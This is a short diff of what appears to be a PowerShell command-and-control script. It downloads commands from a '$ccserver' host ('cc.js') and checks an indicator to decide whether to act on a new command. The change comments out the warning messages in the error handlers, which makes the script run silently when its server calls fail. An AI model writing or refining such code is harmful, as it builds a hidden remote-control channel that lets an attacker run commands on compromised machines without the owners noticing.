@@ -84,7 +84,7 @@ $Command = $web.DownloadString("https://$ccserver/cc.js")
 Write-Output $Command
 }
 Catch{
-Write-Warning $error[0].Exception.InnerException
+#Write-Warning $error[0].Exception.InnerException
 #Write-Warning "Server is offline"
 #Write-Output $Command
 }
@@ -130,7 +130,7 @@ if($Indicator -eq '1' -And $PreviousCommand -ne $CurrentCommand) {
         }
     catch {
         $StatusCode = $_.Exception.Response.StatusCode.value__
-        Write-Warning $error[0].Exception.InnerException
+        #Write-Warning $error[0].Exception.InnerException
         }
 } 
 
